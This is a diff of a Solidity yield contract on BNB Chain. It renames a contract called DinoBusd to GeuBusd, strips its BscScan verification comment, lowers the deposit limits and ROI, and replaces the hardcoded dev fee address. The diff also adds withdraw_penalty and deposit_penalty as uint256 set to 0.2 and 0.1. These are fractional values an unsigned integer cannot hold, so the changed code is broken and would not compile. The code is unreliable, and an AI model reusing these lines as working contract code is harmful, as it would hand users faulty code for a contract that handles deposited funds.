@@ -1,7 +1,3 @@
-/**
- *Submitted for verification at BscScan.com on 2022-06-20
- */
-
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.14;
 
@@ -338,15 +334,17 @@ abstract contract ReentrancyGuard {
     }
 }
 
-contract DinoBusd is Context, Ownable, ReentrancyGuard {
+contract GeuBusd is Context, Ownable, ReentrancyGuard {
     using SafeMath for uint256;
-    uint256 public constant min = 50 ether;
-    uint256 public constant max = 100000 ether;
-    uint256 public roi = 8;
+    uint256 public constant min = 10 ether;
+    uint256 public constant max = 10000 ether;
+    uint256 public roi = 3;
+    uint256 public withdraw_penalty = 0.2;
+    uint256 public deposit_penalty = 0.1;
     uint256 public constant fee = 6;
     uint256 public constant withdraw_fee = 2;
     uint256 public constant ref_fee = 10;
-    address public dev = 0x857Bf8867a41441653134500D6c6457Ee3cc1934;
+    address public dev = 0x66294C989937Eb7171C3A1790957f36979CF03D5;
     IERC20 private BusdInterface;
     address public tokenAdress;
     bool public init = false;
